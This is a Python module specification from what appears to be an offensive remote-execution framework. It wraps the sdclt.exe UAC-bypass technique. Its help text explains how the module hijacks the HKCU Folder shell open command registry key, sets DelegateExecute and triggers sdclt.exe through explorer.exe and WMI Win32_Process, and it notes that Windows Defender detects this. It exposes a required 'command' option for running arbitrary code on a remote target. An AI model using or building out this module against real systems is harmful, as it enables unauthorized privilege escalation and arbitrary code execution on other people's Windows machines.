from lib.core.specmodule import SpecModule
from lib.modhandlers.generic import quotedstring


class Spec(SpecModule):
    def __init__(self, templatepath, helpers):
        self.options = {}
        self.helpers = helpers
        self.help = """
        DETECTED BY WINDOWS DEFENDER AS
        Behavior:Win32/UACBypassExp.T!proc
        
        Execute a command using the SDCLT.exe UAC bypass. 
        This module sets HKCU\\Software\\Classes\\Folder\\shell\open\\command default value to the specified command option.
        It also sets the DelegateExecute under the same path and executes:
        explorer.exe /root,c:\windows\system32\sdclt.exe
        Execution through win32_process create
        
        It uses WbemScripting.SWbemLocator
        - ConnectServer(root\cimv2)
        - ConnectServer(root\cimv2).Get("Win32_ProcessStartup").SpawnInstance_()
        - ConnectServer(root\cimv2).Get("Win32_Process")

        """
        self.entry = 'Execute_UAC_sdclt'
        self.depends = ['./helperFunctions/Setregvalue_hkcu.txt','./helperFunctions/Delregkey_hkcu.txt']
        self.options['command'] = {
            "value": None,
            "required": True,
            "description": "Command to execute on remote target",
            "handler": quotedstring
        }
        super().__init__(templatepath)
